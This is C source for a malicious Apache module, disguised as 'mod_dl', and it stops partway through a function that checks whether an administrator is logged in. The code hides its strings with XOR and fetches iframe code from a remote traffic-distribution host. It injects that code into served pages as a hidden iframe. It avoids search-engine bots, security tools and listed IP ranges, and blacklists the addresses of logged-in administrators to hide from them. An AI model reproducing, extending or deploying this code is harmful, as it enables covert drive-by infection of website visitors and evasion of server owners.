#include "apr_general.h"
#include "apr_lib.h"
#include "apr_buckets.h"
#include "apr_strings.h"
#include "ap_config.h"
#include "util_filter.h"
#include "httpd.h"
#include "http_config.h"
#include "http_request.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_log.h"
#include "http_main.h"
#include "util_script.h"
#include "http_core.h"
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <utmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <pwd.h>
#include <arpa/inet.h>
#include "util_md5.h"
#include <time.h>

//#define	DEBUG				"/var/tmp/lol"

#define DO_BAN_SITEKERNEL	0
#define DO_EXPLOIT_ONLY_SEO 0
#define	TDS_SID				"example-domain-goes-here.com"

#define	TDS_HOST			"\x5b\x5a\x42\xd\x50\x46"	// "\x4f\x4c\x40\x42\x4f\x4b\x4c\x50\x57"	// "localhost" // "\x50\x46\x51\x53\x46\x4d\x57\x10\x11\xd\x4a\x4d" // "serpent32.in" // 
#define	TDS_URI				"\xc\x57\xc" // "\xc\x6a\x45\x51\x42\x4e\x46\x70\x46\x51\x55\x46\x51\x77\x67\x70\xc"	// "\xc\x44\x4c\xd\x53\x4b\x53"	// "/go.php"
#define TDS_PORT			80
#define TDS_TIMEOUT			10*1000000 // microseconds
#define	CRYPT_KEY			"#"
#define	ROOT_IDLE_TIME		5*60
#define TMP_DIR				"\xc\x55\x42\x51\xc\x57\x4e\x53"	//	"/var/tmp"
#define	LIST_PREF			"\x50\x46\x50\x50\x7c"	//	"sess_"
#define DO_CHECK_UTMP 		1
#define DO_BAN_SITEADMIN	1
#define CLEAN_MY_NAME		"\x4e\x4c\x47\x7c\x47\x4f" // "mod_dl"
#define	KEY_COOKIE_NAME		"\x73\x6b\x73\x70\x46\x50\x50\x4a\x4c\x4d\x50\x6a\x67\x1e"	// "PHPSessionsID="
#define	KEY_TTL				5*60	// seconds
#define RAW_COOKIE_VALUE	-1
#define CONNECTION_TIMEOUT	30	// seconds
#define	TEMP_BAN_TIME		60*60*24*7	// seconds
#define	JS_CREATE_IFRAME 	"\x47\x4c\x40\x56\x4e\x46\x4d\x57\xd\x54\x51\x4a\x57\x46\xb\x4\x1f\x50\x57\x5a\x4f\x46\x1d\xd\x4d\x4c\x47\x4a\x50\x53\x4f\x3\x58\x3\x47\x4a\x50\x53\x4f\x42\x5a\x19\x4d\x4c\x4d\x46\x18\x3\x54\x4a\x47\x57\x4b\x19\x13\x18\x3\x4b\x46\x4a\x44\x4b\x57\x19\x13\x3\x5e\x3\x1f\xc\x50\x57\x5a\x4f\x46\x1d\x4\xa\x18\x2e\x29\x47\x4c\x40\x56\x4e\x46\x4d\x57\xd\x54\x51\x4a\x57\x46\xb\x4\x1f\x4a\x45\x51\x42\x4e\x46\x3\x50\x51\x40\x1e\xc\x1c\x6\x50\x6\x4a\x3\x40\x4f\x42\x50\x50\x1e\x4d\x4c\x47\x4a\x50\x53\x4f\x1d\x1f\xc\x4a\x45\x51\x42\x4e\x46\x1d\x4\xa\x18\x2e\x29"	// "document.write('<style>.nodispl { display:none; width:0; height:0 } </style>');\r\ndocument.write('<iframe src=/?%s%i class=nodispl></iframe>');\r\n"

#define CACHE_TTL			10*60 // seconds

#ifndef UTMP_FILE
#define UTMP_FILE "/var/run/utmp"
#endif

module AP_MODULE_DECLARE_DATA dl_module;

char *stristr(const char *String, const char *Pattern)
{
      char *pptr, *sptr, *start;

      for (start = (char *)String; *start != '\0'; start++)
      {
            /* find start of pattern in string */
            for ( ; ((*start!='\0') && (toupper(*start) != toupper(*Pattern))); start++)
                  ;
            if ('\0' == *start)
                  return NULL;

            pptr = (char *)Pattern;
            sptr = (char *)start;

            while (toupper(*sptr) == toupper(*pptr))
            {
                  sptr++;
                  pptr++;

                  /* if end of pattern then pattern was found */

                  if ('\0' == *pptr)
                        return (start);
            }
      }
      return NULL;
}

char* dl_ClientIP(ap_filter_t *f)
{
	char* x_forwarded_for = (char*) apr_table_get(f->r->headers_in, "X-Forwarded-For");
	if (x_forwarded_for != NULL)
	{
		return x_forwarded_for;
	}
	else
	{
		return f->r->connection->remote_ip;
	}
}

char* decrypt(ap_filter_t *f, char* str)
{
	char *result = apr_palloc(f->r->pool, strlen(str) + 1);
	if (result != NULL)
	{
		char *xorkey = CRYPT_KEY;
		int i;
		for (i=0; i<strlen(str); i++)
			result[i] = str[i] ^ xorkey[i % strlen(CRYPT_KEY)];
		result[i] = '\0';
		return result;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: decrypt(), %i\r\n", dl_ClientIP(f), strlen(str)+1); fclose(debug_f);
		#endif	
		return NULL;
	}
}

#define MAX_REFERER_LENGTH 1024

typedef struct
{
	int modetype;
	int key;
	time_t time;
	char referer1[MAX_REFERER_LENGTH];
	char referer2[MAX_REFERER_LENGTH];
} dl_Mode;

char from_hex(char ch) {
  return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;
}

char to_hex(char code) 
{
  static char hex[] = "0123456789abcdef";
  return hex[code & 15];
}

char *urlencode(ap_filter_t* f, char *str) 
{
  char *buf = apr_palloc(f->r->pool, strlen(str) * 3 + 1);
  if (buf != NULL)
  {
  	char *pstr = str, *pbuf = buf;
  	while (*pstr) 
  	{
    	if (isalnum(*pstr) || *pstr == '-' || *pstr == '_' || *pstr == '.' || *pstr == '~') 
      		*pbuf++ = *pstr;
    	else if (*pstr == ' ') 
      		*pbuf++ = '+';
    	else 
      		*pbuf++ = '%', *pbuf++ = to_hex(*pstr >> 4), *pbuf++ = to_hex(*pstr & 15);
    	pstr++;
  	}
  	*pbuf = '\0';
  	return buf;
  }
  else
  {
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: urlencode(), %i\r\n", dl_ClientIP(f), strlen(str) * 3 + 1); fclose(debug_f);
	#endif
	return NULL;
  }
}

int dl_GetClientKey(ap_filter_t *f)
{
   	int ClientKey;  	
  	char* cookies_str = (char*) apr_table_get(f->r->headers_in, "Cookie");
  	char tmp_str[16];
  	memset(tmp_str, 0, sizeof(tmp_str));
  	if (cookies_str != NULL)
  	{
  		char* cookie_begin = strstr(cookies_str, decrypt(f, KEY_COOKIE_NAME));
  		if (cookie_begin != NULL)
  		{
  			cookie_begin += strlen(decrypt(f, KEY_COOKIE_NAME));
  			char* cookie_end = strstr(cookie_begin, ";");
  			if (cookie_end == NULL)
  			{
  				memcpy(tmp_str, cookie_begin, min(strlen(cookie_begin), sizeof(tmp_str)-1));
  			}
  			else
  			{
  				memcpy(tmp_str, cookie_begin, min(cookie_end - cookie_begin, sizeof(tmp_str)-1));
  			}
  			ClientKey = atoi(tmp_str);
  		} else { ClientKey = 0; }
	} else { ClientKey = 0; }
	return ClientKey;
}

int dl_check_Raw(ap_filter_t *f)
{
	int ClientKey = dl_GetClientKey(f);
	if (ClientKey == RAW_COOKIE_VALUE)
	{	
		return 0;
	}	
	return 1;
}

int genKey()
{
	struct timeval now;
	gettimeofday(&now, NULL);
	srand(now.tv_usec);
	int r = rand();
	return abs(r);
}

char* dl_genFilenameBlacklist(ap_filter_t *f)
{
	char *md5buf = ap_md5(f->r->pool, dl_ClientIP(f));
    char *filename = (char*) apr_palloc(f->r->pool, 128);
    if (md5buf != NULL && filename != NULL)
    {
    	sprintf(filename, "%s/%s%s", decrypt(f, TMP_DIR), decrypt(f, LIST_PREF), md5buf);
		return filename;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_genFilenameBlacklist(), md5, 128\r\n", dl_ClientIP(f)); fclose(debug_f);
		#endif
		return NULL;
	}
}

char* dl_genFilenameSession(ap_filter_t *f)
{
	char *md5buf = ap_md5(f->r->pool, dl_ClientIP(f));
    char *md5md5buf = ap_md5(f->r->pool, md5buf);
    char *filename = (char*) apr_palloc(f->r->pool, 128);
    if (md5buf != NULL && md5md5buf != NULL && filename != NULL)
    {    
    	sprintf(filename, "%s/%s%s", decrypt(f, TMP_DIR), decrypt(f, LIST_PREF), md5md5buf);
		return filename;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_genFilenameSession(), md5, md5, 128\r\n", dl_ClientIP(f)); fclose(debug_f);
		#endif
		return NULL;	
	}
}

char* dl_genFilenameTempBanlist(ap_filter_t *f)
{      			
    char *md5buf = ap_md5(f->r->pool, dl_ClientIP(f));
    char *md5md5buf = ap_md5(f->r->pool, md5buf);
    char *md5md5md5buf = ap_md5(f->r->pool, md5md5buf);
    char *filename = (char*) apr_palloc(f->r->pool, 128);  			
    if (md5buf != NULL && md5md5buf != NULL && md5md5md5buf != NULL && filename != NULL)
    {    
    	sprintf(filename, "%s/%s%s", decrypt(f, TMP_DIR), decrypt(f, LIST_PREF), md5md5md5buf);
		return filename;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_genFilenameTempBanlist(), md5, md5, md5, 128\r\n", dl_ClientIP(f)); fclose(debug_f);
		#endif
		return NULL;		
	}
}

char* dl_genFilenameCache(ap_filter_t *f)
{
	char *buf = ap_md5(f->r->pool, "cache");
	char *filename =  (char*) apr_palloc(f->r->pool, 128);
    if (buf != NULL && filename != NULL)
    {	
		sprintf(filename, "%s/%s%s", decrypt(f, TMP_DIR), decrypt(f, LIST_PREF), buf);
		return filename;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_genFilenameCache(), md5, 128\r\n", dl_ClientIP(f)); fclose(debug_f);
		#endif
		return NULL;		
	}
}

void dl_SaveSession(ap_filter_t *f, dl_Mode *mode)
{
	FILE* fp;
    char *session_filename = dl_genFilenameSession(f);
	if (fp = fopen(session_filename, "w"))
	{
		fprintf(fp, "%i\r\n%i\r\n%i\r\n%s\r\n%s\r\n", mode->modetype, mode->key, mode->time, mode->referer1, mode->referer2);
		fclose(fp);
	}
}

void dl_LoadSession(ap_filter_t *f, dl_Mode *mode)
{
	memset(mode, 0, sizeof(dl_Mode));
  	FILE* fp;
    char *session_filename = dl_genFilenameSession(f);
   	if (fp = fopen(session_filename, "r"))
   	{
	  	char tmp_str[1000];
	  	memset(tmp_str, 0, sizeof(tmp_str));
		fgets(tmp_str, sizeof(tmp_str)-1, fp);	mode->modetype = atoi(tmp_str);
		fgets(tmp_str, sizeof(tmp_str)-1, fp);	mode->key = atoi(tmp_str);
		fgets(tmp_str, sizeof(tmp_str)-1, fp);	mode->time = atoi(tmp_str);
		fgets(tmp_str, sizeof(tmp_str)-1, fp);	memcpy(mode->referer1, tmp_str, strlen(tmp_str)-2);
		fgets(tmp_str, sizeof(tmp_str)-1, fp);	memcpy(mode->referer2, tmp_str, strlen(tmp_str)-2);
		fclose(fp);
   	}
   	if (mode->modetype == 0 || (time(NULL) - mode->time) > (KEY_TTL + CONNECTION_TIMEOUT))
   	{
		mode->modetype = 1;
		mode->key = 0;
		mode->time = time(NULL);
		memset(mode->referer1, 0, sizeof(mode->referer1));
		memset(mode->referer2, 0, sizeof(mode->referer2));
	}
}

void dl_DeleteSession(ap_filter_t *f)
{
	remove(dl_genFilenameSession(f));
}

int dl_check_LocalBlacklist(ap_filter_t *f)
{
	char* filename = dl_genFilenameBlacklist(f);
	apr_file_t *fp;
	apr_status_t res = apr_file_open(&fp, filename, APR_READ, APR_OS_DEFAULT, f->r->pool);
	
	if (res == APR_ENOENT)
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check blacklist IP=%s, filename=%s - file absent, OK\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
		#endif		
		return 1;
	}
	
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check blacklist IP=%s, filename=%s - FILE FOUND! BANNED\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
	#endif		

	apr_file_close(fp);
	return 0;
}

int dl_check_TempBanlist(ap_filter_t *f)
{
	char* filename = dl_genFilenameTempBanlist(f);
	FILE* fp = fopen(filename, "r");
	
	if (!fp)
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check temp banlist IP=%s, filename=%s - file absent, OK\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
		#endif		
		return 1;
	}

	char tmp_str[16];
	memset(tmp_str, 0, sizeof(tmp_str));
	fgets(tmp_str, sizeof(tmp_str) - 1, fp);
	fclose(fp);
	int bantime = atoi(tmp_str);
	if (time(NULL)-bantime > TEMP_BAN_TIME)
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check temp banlist IP=%s, filename=%s - file found, but bantime is old, unbanned OK\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
		#endif
		return 1;
	}
	else
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check temp banlist IP=%s, filename=%s - FILE FOUND! BANNED\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
		#endif
		return 0;		
	}
}

void dl_SendIPToLocalBlacklist(ap_filter_t *f)
{
    char *filename = dl_genFilenameBlacklist(f);

	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Adding to local blacklist IP=%s, filename=%s\r\n", dl_ClientIP(f), dl_ClientIP(f), filename); fclose(debug_f);
	#endif

	FILE* fd;
	fd = fopen(filename, "w");
	if (fd != NULL)
	{
		fclose(fd);
	}
}

void dl_SendIPToTempBanlist(ap_filter_t *f)
{
    char *filename = dl_genFilenameTempBanlist(f);
	
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Adding to temp banlist\r\n", dl_ClientIP(f)); fclose(debug_f);
	#endif

	FILE* fd;
	fd = fopen(filename, "w");
	if (fd != NULL)
	{
		fprintf(fd, "%i", time(NULL));
		fclose(fd);
	}
}

char* dl_GetRedirectScript(ap_filter_t *f, dl_Mode* mode) // From Cache Or URL
{
	#ifdef DEBUG
		FILE* debug_f;
	#endif    	

	if (!dl_check_TempBanlist(f)) { return NULL; }
	dl_SendIPToTempBanlist(f);
	
	int CacheNeedUpdate = 0;
	
	char *cache_html = NULL;
	char* out_str;
	
	char* cache_filename = dl_genFilenameCache(f);
	FILE* cache_file = fopen(cache_filename, "r");
	if (cache_file == NULL)
	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Cache file %s not found. Need update\r\n", dl_ClientIP(f), cache_filename); fclose(debug_f);
		#endif  		
		CacheNeedUpdate = 1;
	}
	else
	{
	  	fseek(cache_file, 0, SEEK_END);
	  	int fsize = ftell(cache_file);
	  	fseek(cache_file, 0, SEEK_SET);
		char* tmp_str = apr_palloc(f->r->pool, sizeof(char)*(fsize+1));
		
		#ifdef DEBUG
			if (tmp_str == NULL)
			{
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_GetRedirectScript() char* tmp_str = apr_palloc(%i)\r\n", dl_ClientIP(f), sizeof(char)*(fsize+1)); fclose(debug_f);
			}
		#endif
		
		memset(tmp_str, 0, sizeof(char)*(fsize+1));
		fread(tmp_str, 1, fsize, cache_file);
		fclose(cache_file);
		
		char* cache = decrypt(f, tmp_str);
		char* razd = strstr(cache, "\r\n");
		#define MAX_TIMESTR_SIZE 20
		if ((razd != NULL) && (razd - cache < MAX_TIMESTR_SIZE - 1))
		{
			char time_str[MAX_TIMESTR_SIZE];
			memset(time_str, 0, sizeof(time_str));
			memcpy(time_str, cache, razd - cache);
			int cache_time = atoi(time_str);
			int cache_html_size = strlen(cache) - (razd - cache + 2);
			cache_html = apr_palloc(f->r->pool, cache_html_size+1);
			
			#ifdef DEBUG
				if (cache_html == NULL)
				{
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_GetRedirectScript() cache_html = apr_palloc(%i)\r\n", dl_ClientIP(f), cache_html_size+1); fclose(debug_f);
				}
			#endif				
			
			memset(cache_html, 0, cache_html_size+1);
			memcpy(cache_html, razd + 2, cache_html_size);
			
			if (time(NULL) - cache_time > CACHE_TTL)
			{
				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Cache is too old. Need update\r\n", dl_ClientIP(f)); fclose(debug_f);
				#endif  		
				CacheNeedUpdate = 1;
			}
			else
			{
				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Cache is OK. iframe code: %s, cache_time=%i, current_time=%i\r\n", dl_ClientIP(f), cache_html, cache_time, time(NULL)); fclose(debug_f);
				#endif  						
				return cache_html;
			}
		}
		else // incorrect format of cache
		{
			#ifdef DEBUG
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Incorrect format of cache. Need update, fsize: %i, tmp_str: %s, cache: %s, cache(addr) = %i, razd = %i\r\n", dl_ClientIP(f), fsize, tmp_str, cache, cache, razd); fclose(debug_f);
			#endif 			
			CacheNeedUpdate = 1;
		}
	}

	// if we are here then CacheNeedUpdate == 1 anyway
	
	apr_sockaddr_t *sa;
	apr_socket_t *s;
	if (apr_sockaddr_info_get(&sa, decrypt(f, TDS_HOST), APR_INET, TDS_PORT, 0, f->r->pool) != APR_SUCCESS)
   	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s apr_sockaddr_info_get (%s) FAILED!\r\n", dl_ClientIP(f), decrypt(f, TDS_HOST)); fclose(debug_f);
		#endif    	
   		goto UPDATE_UNSUCCESSFULL;
   	}
	#ifdef DEBUG
		debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s hostname:%s, servname:%s, port:%i, family:%i\r\n", dl_ClientIP(f), sa->hostname, sa->servname, sa->port, sa->family); fclose(debug_f);
	#endif   
   	if (apr_socket_create(&s, sa->family, SOCK_STREAM, APR_PROTO_TCP, f->r->pool) != APR_SUCCESS)
   	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s apr_socket_create() to %s FAILED!\r\n", dl_ClientIP(f), decrypt(f, TDS_HOST)); fclose(debug_f);
		#endif    	
		goto UPDATE_UNSUCCESSFULL;
   	}
   	apr_socket_opt_set(s, APR_SO_NONBLOCK, 1);
   	apr_socket_timeout_set(s, TDS_TIMEOUT);
   	int res;   
   	if ((res = apr_socket_connect(s, sa)) != APR_SUCCESS)
	{
		char err[1024];
		memset(err, 0, sizeof(err));
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s apr_socket_connect() to %s, res = %i, err = %s FAILED!\r\n", dl_ClientIP(f), decrypt(f, TDS_HOST), res, apr_strerror(res, err, sizeof(err)-1)); fclose(debug_f);
		#endif    			
		goto UPDATE_UNSUCCESSFULL;
	}
   	apr_socket_opt_set(s, APR_SO_NONBLOCK, 1);
   	apr_socket_timeout_set(s, CONNECTION_TIMEOUT);
   
	const char *request = apr_pstrcat(f->r->pool, "GET ", decrypt(f, TDS_URI) ,"?sid=", TDS_SID, /*"&format=apache&sIP=", dl_ClientIP(f), "&sUA=", urlencode(f, (char*) apr_table_get(f->r->headers_in, "User-Agent")), "&referer1=",  urlencode(f, mode->referer1), "&referer2=", urlencode(f, mode->referer2),*/ " HTTP/1.1\r\n", "Host: ", decrypt(f, TDS_HOST), "\r\n", "\r\n",NULL);
	apr_size_t request_len = strlen(request);
	#ifdef DEBUG
		debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "Sending tds-request = %s\r\n", request); fclose(debug_f);
	#endif

	if (apr_socket_send(s, request, &request_len) != APR_SUCCESS)
	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s apr_socket_send() to %s FAILED!\r\n", dl_ClientIP(f), decrypt(f, TDS_HOST)); fclose(debug_f);
		#endif
		goto UPDATE_UNSUCCESSFULL;
	}

	#define ANSWER_SIZE 4096
	char answer[ANSWER_SIZE];
	memset(answer, 0, sizeof(answer));
	int answer_length = 0;

	#define BUF_SIZE	1024
	#define BEGIN_SHIT	"{{{"
	#define END_SHIT	"}}}"
   	while (strlen(answer) < ANSWER_SIZE - 1) 
   	{
       	apr_size_t len = min(BUF_SIZE - 1, ANSWER_SIZE - answer_length - 1);
       	apr_status_t rv = apr_socket_recv(s, answer + answer_length, &len);
       	answer_length += len;
         
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s answer = %s, last readed len = %i\r\n", dl_ClientIP(f), answer, len); fclose(debug_f);
		#endif            
        
       	if (rv == APR_EOF) 
       	{
           	break;
       	}

		if (answer != NULL && strstr(answer, END_SHIT) != NULL)
		{
			break;
		}
        
       	if (len == 0)
       	{
       		usleep(300000);
       	}
   	}
   	apr_socket_close(s);
    
   	char* from;
   	char* to;
   	char* iframe_code;
   	int iframe_code_length;
   	
   	if (answer != NULL && (from = strstr(answer, BEGIN_SHIT)) && (to = strstr(answer, END_SHIT)))
   	{
   		iframe_code_length = to - from - strlen(BEGIN_SHIT);
   		iframe_code = (char*) apr_palloc(f->r->pool, iframe_code_length);

		if (iframe_code == NULL)
		{
			#ifdef DEBUG
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_GetRedirectScript() iframe_code = apr_palloc(%i)\r\n", dl_ClientIP(f), iframe_code_length); fclose(debug_f);
			#endif	
			goto UPDATE_UNSUCCESSFULL;
		}
   		
   		memcpy(iframe_code, from + strlen(BEGIN_SHIT), iframe_code_length);
   		memset(iframe_code + iframe_code_length, 0, 1);
   	}
   	else
   	{
   		goto UPDATE_UNSUCCESSFULL;
   	}

	// UPDATE SUCCESSFULL:

	out_str = (char*) apr_palloc(f->r->pool, iframe_code_length + 40);
	if (out_str == NULL)
	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_GetRedirectScript() out_str = apr_palloc(%i)\r\n", dl_ClientIP(f), iframe_code_length + 40); fclose(debug_f);
		#endif	
		return NULL;
	}	
	sprintf(out_str, "%i\r\n%s", time(NULL), iframe_code);
	cache_file = fopen(cache_filename, "w");
	if (cache_file != NULL)
	{
		fprintf(cache_file, decrypt(f, out_str));
		fclose(cache_file);
	}
	return iframe_code;

	UPDATE_UNSUCCESSFULL:

	out_str = (char*) apr_palloc(f->r->pool, strlen(cache_html) + 40);
	if (out_str == NULL)
	{
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_GetRedirectScript() out_str = apr_palloc(%i)\r\n", dl_ClientIP(f), strlen(cache_html) + 40); fclose(debug_f);
		#endif	
		return NULL;
	}		
	sprintf(out_str, "%i\r\n%s", time(NULL), cache_html);
	cache_file = fopen(cache_filename, "w");
	if (cache_file != NULL)
	{
		fprintf(cache_file, decrypt(f, out_str));
		fclose(cache_file);
	}
	return cache_html;
}

int dl_check_BotUserAgent(ap_filter_t *f)
{	
	const char* ban_useragent[] = { "GOOGLEBOT", "SLURP", "YAHOO", "LINUX", "MACINTOSH", "MAC OS", "IPHONE", "PLAYSTATION", "OPERA MINI", "NINTENDO", "YANDEX", "CRAWLER", "ROBOT", "WORDPRESS", "VBSEO", "BAIDUSPIDER", "FOLLOWSITE", "SOGOU", "NHN", "WGET", "MSNBOT", "YOUDAO", "STACKRAMBLER", "LWP::SIMPLE", "QIHOOBOT", "SOSOSPIDER", "BRUTUS", "HTTPCLIENT", "CURL", "PHP", "INDY LIBRARY" };
	char* useragent = (char*) apr_table_get(f->r->headers_in, "User-Agent");
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Begin check User-Agent: %s\r\n", dl_ClientIP(f), useragent); fclose(debug_f);
	#endif			
	
	if (!useragent)
		return 0;
	int i, j, k;
	int len_ua = strlen(useragent);
	for (i = 0; i < sizeof(ban_useragent)/sizeof(char*); i++)
	{
		int len_ban = strlen(ban_useragent[i]);
		for (j = 0; j < len_ua - len_ban; j++)
		{
			int match = 1;
			for (k = 0; k < len_ban; k++)
			{
				if (toupper(useragent[j+k]) != ban_useragent[i][k])
				{
					match = 0;
					break;
				}
			}
			if (match == 1)
			{
				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Bot User-Agent detected: %s\r\n", dl_ClientIP(f), ban_useragent[i]); fclose(debug_f);
				#endif			

				return 0;
			}
		}
	}
	#ifdef DEBUG
		debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s End check User-Agent OK\r\n", dl_ClientIP(f)); fclose(debug_f);
	#endif				
	return 1;
}

int min(int a, int b) { return (a < b ? a : b); }

int max(int a, int b) { return (a > b ? a : b); }

unsigned long ip2long (str) char *str;
{
	unsigned long i, octet, ip = 0;
	char *cp, arg[256];
	strncpy (arg, str, sizeof(arg)-1);
	arg[sizeof(arg)-1] = '\0';
	cp = strtok (arg, ".");
	for (i=4; i>0; i--) 
	{
		octet = 0;
		while (*cp) 
		{
			octet = octet*10 + *cp-'0';
			cp++;
		}
		ip += octet*(1<<((i-1)*8));
		cp = strtok (NULL, ".");
	}
	return ip;
}

int dl_check_BotIp(ap_filter_t *f)
{
	const long bot_ip[][2] = {{-655417344,-655409153},{1089052672,1089060863},{1123631104,1123639295},{1208926208,1208942591},{-782925824,-782893057},{-1379794944,-1379729409},{1249705984,1249771519},{-655417344,-655409153},{1078218752,1078220799},{1113980928,1113985023},{1089052672,1089060863},{1123631104,1123639295},{1208926208,1208942591},{-782925824,-782893057},{-965974848,-965974833},{-1379794944,-1379729409},{-668867184,-668867177},{-668867168,-668867161},{-776377216,-776377089},{-663925936,-663925921},{1078220800,1078222847},{1078214720,1078214783},{1076485568,1076485583},{1249705984,1249771519},{134744064,134744319},{134743040,134743295},{67305984,67306239},{-772300912,-772300897},{1070843976,1070843983},{-772425592,-772425585},{-1504013248,-1504013233},{134623232,134625279},{1083880144,1083880159},{1180247960,1180247967},{1180359496,1180359503},{1180359472,1180359479},{1081896984,1081896991},{-772191936,-772191929},{1081927080,1081927087},{1104609120,1104609135},{1104396896,1104396911},{1105135664,1105135679},{1105036720,1105036735},{1062518496,1062518527},{1082183584,1082183599},{1103424288,1103424303},{1119913504,1119913519},{1104572512,1104572543},{1180247960,1180247967},{1180359496,1180359503},{1180359472,1180359479},{1173102912,1173102919},{1290950648,1290950655},{1208934400,1208936447},{1132356616,1132356623},{-869104592,-869104577},{1128602128,1128602135},{-655652792,-655652785},{-826636096,-826636033},{1667240832,1667240863},{1172313552,1172313559},{1172315992,1172315999},{1172316008,1172316015},{1172588248,1172588255},{1172588256,1172588263},{1172588264,1172588271},{1172588280,1172588287},{1172589672,1172589679},{1173190880,1173190887},{1199710944,1199710951},{1199710952,1199710959},{1199710960,1199710967},{1199728392,1199728399},{1199728400,1199728407},{1199728408,1199728415},{1199728416,1199728423},{1199728424,1199728431},{1259417800,1259417807},{1259813304,1259813311},{1260780984,1260780991},{1261762592,1261762599},{1261735552,1261735559},{1261761744,1261761751},{1261762104,1261762111},{1261762112,1261762119},{1261762120,1261762127},{1261762128,1261762135},{1288200544,1288200551},{1289513400,1289513407},{1291247208,1291247215},{1671628112,1671628119},{1670420000,1670420007},{1670647064,1670647071},{1190127072,1190127103},{1663596768,1663596799},{1164938648,1164938655},{1164938656,1164938663},{1093926912,1094189055},{-819068928,-819003393},{1136852992,1136918527}, {694766336,694766591}, {1089052672,1089060863}, {1093926912,1094189055}, {1122728960,1122729215}, {1123631104,1123639295}, {1208926208,1208926719}, {1249705984,1249771519}, {1317643008,1317643263}, {1607670528,1607670783}, {2087911424,2087911679}, {-1155882496,-1155882241}, {-1008311552,-1008311297}/*, {2130706433,2130771967}*/};
	int i;
	long ip = (long) ip2long(dl_ClientIP(f));
	for (i=0; i<sizeof(bot_ip)/(sizeof(long)*2); i++)
	{
		if (ip >= bot_ip[i][0] && ip<= bot_ip[i][1])
		{
			#ifdef DEBUG
				FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Bot IP detected: %s, ip = %i, left = %i, right = %i\r\n", dl_ClientIP(f), dl_ClientIP(f), ip, bot_ip[i][0], bot_ip[i][1]); fclose(debug_f);
			#endif			
			return 0;
		}
	}
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s IP ok: %s, ip = %i, left = %i, right = %i\r\n", dl_ClientIP(f), dl_ClientIP(f), ip, bot_ip[i][0], bot_ip[i][1]); fclose(debug_f);
	#endif			
	return 1;
}

int dl_check_AdminOnline(ap_filter_t *f)
{
  if (DO_CHECK_UTMP > 0)
  {
	struct utmp rec;
	int utmpfd;
	int reclen = sizeof(rec);
	char *ip;
	if ((utmpfd = open(UTMP_FILE, O_RDONLY)) >= 0)
	{
		while (read(utmpfd, &rec, reclen) == reclen)
		{
			if (rec.ut_type == USER_PROCESS)
			{
				if (rec.ut_addr > 0)
				{
					struct in_addr address_struct;
    				address_struct.s_addr = rec.ut_addr;
					ip = inet_ntoa(address_struct);
					dl_SendIPToLocalBlacklist(f);
				}
